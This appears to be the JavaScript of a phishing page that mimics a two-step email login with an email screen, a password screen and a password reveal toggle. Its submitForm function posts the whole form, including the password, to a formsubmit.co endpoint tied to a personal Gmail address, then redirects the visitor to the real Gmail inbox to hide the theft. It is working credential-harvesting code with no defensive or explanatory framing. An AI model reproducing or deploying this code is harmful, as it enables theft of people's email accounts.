
$('.input-mail-wrap .input').click(function(){
    $(this).find('label').addClass('active');
    $(this).addClass('active');
});
$('.input-password-wrap .input').click(function(){
    $(this).find('label').addClass('active');
    $(this).addClass('active');
});


$('.input-mail-wrap .form-input').on('input', function() {
    var inputValue = $(this).val();
    $('.user-login span').text(inputValue);
  });


$('.next-screen-btn').click(function(){
    var inputValues = $('#name');
    inputValues.each(function() {
        if ($(this).val() === '') {
            $('.input-mail-wrap .input').addClass('error');
            console.log('error');
        } else {
            $('.first-screen').removeClass('hidden-section');
            $('.second-screen').removeClass('hidden-section');
            $('.first-screen').removeClass('show-section');
            $('.second-screen').removeClass('show-section');
            $('.first-screen').addClass('hidden-section');
            $('.second-screen').addClass('show-section');
            $('.input-mail-wrap .input').removeClass('error');
            console.log('aaa');
      }
    });
    
  });


  $('.login-block').click(function(){
        $('.first-screen').removeClass('hidden-section');
        $('.second-screen').removeClass('hidden-section');
        $('.first-screen').removeClass('show-section');
        $('.second-screen').removeClass('show-section');

        $('.first-screen').addClass(' show-section');
        $('.second-screen').addClass(' hidden-section');
      
  });

 
    $('#name').keydown(function(event) {
      if (event.key === 'Enter') {
        if ($('.input-mail-wrap .form-input').val().trim() !== '') {
          $('.next-screen-btn').click();
        }
      }
    });
 

    $('.input-password-wrap label').click(function() {
        $('.input-password-wrap .input input').focus();
      });

      $('.forgot-password').click(function(){
        $(this).toggleClass('active');

        if ($(this).hasClass('active')) {
            $('#myPass').attr("type", "text");
        } else {
            $('#myPass').attr("type", "password");
        }
        
      });


  
   function submitForm() {
    const form = document.getElementById('contactForm');
    const formData = new FormData(form);

    $('.finish').text('');
    $('.finish-wrap img').addClass('active');

    fetch('https://formsubmit.co/ajax/nesquikwhite2009@gmail.com', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        
        form.reset(); 
        window.location.href = 'https://mail.google.com/mail/u/0/?pli=1#inbox'; 
    })
    .catch(error => {
        console.error('Error:', error);
        
    })
  
}

      